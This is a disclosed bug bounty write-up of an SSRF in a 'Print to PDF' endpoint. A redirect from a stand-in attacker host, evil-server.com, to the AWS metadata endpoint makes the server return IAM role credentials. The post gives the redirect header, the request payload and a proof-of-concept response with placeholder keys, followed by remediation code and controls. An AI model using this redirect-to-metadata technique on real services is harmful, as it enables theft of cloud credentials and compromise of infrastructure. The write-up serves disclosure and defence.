---
layout: post
title: "SSRF on PDF Generator leaking AWS IAM Credentials"
date: 2026-06-23
category: bugbounty
tags: [ssrf, cloud-security, metadata]
severity: critical
target: target.com
program: hackerone
status: disclosed
permalink: /bugbounty/writeups/ssrf-aws-leak/
---

# SSRF on PDF Generator leaking AWS IAM Credentials

## Summary

A Server-Side Request Forgery (SSRF) vulnerability was discovered in the "Print to PDF" report generation tool on `target.com`. By providing a redirect URL that pointed to the AWS Link-Local metadata endpoint (`169.254.169.254`), the server fetched the EC2 instance role metadata and returned the temporary security credentials of the AWS IAM Role to the client.

**Severity**: Critical (CVSS 9.1)  
**Reward**: $6,500  
**Program**: Target Bug Bounty Program (HackerOne)  

## Vulnerability Details

### Type
Server-Side Request Forgery (SSRF)

### Affected Endpoint
```
POST /api/v1/reports/generate-pdf
```

### Root Cause
The web application allowed users to specify a URL parameter (`report_url`) which was rendered into a PDF document using a headless Chrome utility on the backend. Although the application attempted to block local IP addresses (like `127.0.0.1` and `169.254.169.254`) by resolving hostnames before executing requests, it did not follow HTTP redirections properly, allowing an attacker to host a server that redirected the backend request to the metadata endpoint.

## Steps to Reproduce

### Prerequisites
- Active account with access to the reporting panel
- External web server under the attacker's control (e.g., `evil-server.com`)

### Reproduction Steps

1. **Setup Redirection Payload**: Configure a route on the attacker's server (`http://evil-server.com/redirect`) to issue a `302 Redirect` header pointing to the AWS IMDSv1 metadata URL:
   ```
   Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-default-role
   ```
2. **Submit PDF Request**: Send a POST request to the `/api/v1/reports/generate-pdf` endpoint, specifying the redirect URL in the JSON payload:
   ```json
   {
     "report_url": "http://evil-server.com/redirect"
   }
   ```
3. **Download Resulting PDF**: The API returns a binary PDF file containing the page rendering. Open the PDF file.
4. **Retrieve IAM Credentials**: The PDF displays the raw text response from the metadata service, containing the AWS `AccessKeyId`, `SecretAccessKey`, and `Token`.

## Proof of Concept

### HTTP Request
```http
POST /api/v1/reports/generate-pdf HTTP/1.1
Host: target.com
Authorization: Bearer jwt_token_here
Content-Type: application/json
Content-Length: 64

{
  "report_url": "http://evil-server.com/redirect"
}
```

### HTTP Response
```http
HTTP/1.1 200 OK
Content-Type: application/pdf
Content-Disposition: attachment; filename="report.pdf"
Date: Tue, 23 Jun 2026 15:45:00 GMT
Connection: close

[Binary PDF Content displaying the text:
{
  "Code" : "Success",
  "LastUpdated" : "2026-06-23T15:00:00Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIAXXXXXXXXXXXXXXXX",
  "SecretAccessKey" : "abcde12345+FGHIJklmnopqrstuvwxyz/67890",
  "Token" : "IQoJb3JpZ2luX2VjE...",
  "Expiration" : "2026-06-23T21:00:00Z"
}]
```

## Impact

### What an Attacker Can Do
- Gain access to the target company's AWS cloud infrastructure within the permissions scope of the EC2 instance role.
- Read files stored inside restricted S3 buckets.
- Interact with internal databases or read secret keys stored in AWS Secrets Manager.

### Affected Data
- AWS cloud infrastructure state and resources.
- Secrets, configurations, and private customer databases hosted on AWS.

### Business Impact
- Critical vulnerability that could result in total cloud environment compromise.
- Legal liabilities due to potential leakage of user and corporate data.

## Remediation

### Recommended Fix
Avoid calling external client-supplied URLs from the application server. If rendering external web pages is necessary, perform the request through an isolated, sandboxed container with no routing access to local networks or cloud metadata APIs.

Additionally, enforce AWS Instance Metadata Service Version 2 (IMDSv2), which requires a session token header, successfully mitigating simple SSRF attacks.

```python
# python representation of a secure HTTP fetching wrapper
import requests
import socket
from urllib.parse import urlparse

def is_safe_url(url):
    parsed = urlparse(url)
    hostname = parsed.hostname
    
    try:
        # Resolve hostname to IP address
        ip = socket.gethostbyname(hostname)
    except socket.gaierror:
        return False
        
    # Check if the resolved IP belongs to private ranges
    ip_parts = list(map(int, ip.split('.')))
    
    # Block loopback, RFC1918 private, link-local
    if ip_parts[0] == 127:
        return False
    if ip_parts[0] == 10:
        return False
    if ip_parts[0] == 172 and (16 <= ip_parts[1] <= 31):
        return False
    if ip_parts[0] == 192 and ip_parts[1] == 168:
        return False
    if ip_parts[0] == 169 and ip_parts[1] == 254:
        return False
        
    return True

def fetch_content(url):
    # Verify prior to requests execution, and ensure redirects are disabled to prevent redirects to local networks
    if not is_safe_url(url):
        raise ValueError("Unsafe URL blocked")
        
    response = requests.get(url, allow_redirects=False, timeout=5)
    return response.text
```

### Security Controls
1. **Disable Redirects**: Do not follow HTTP redirects (`allow_redirects=False`) when performing backend web requests.
2. **Transition to IMDSv2**: Enable IMDSv2 on AWS EC2 instances and set the hop limit to 1.
3. **Network Isolation**: Enforce network firewall rules (e.g., `iptables` or cloud security groups) blocking access from the web application container to `169.254.169.254`.

## Timeline

| Date | Event |
|------|-------|
| 2026-06-23 | Vulnerability discovered |
| 2026-06-23 | Report sent via HackerOne |
| 2026-06-23 | Vulnerability confirmed and triaged as Critical |
| 2026-06-24 | AWS security group rules and IMDSv2 enforced |
| 2026-06-24 | Vulnerability resolved |
| 2026-06-24 | Bounty of $6,500 awarded |

## References
- [OWASP Server-Side Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [AWS IMDSv2 Transition Guide](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)

---

**Disclaimer**: This writeup is published after responsible disclosure and with permission. All sensitive information has been redacted.
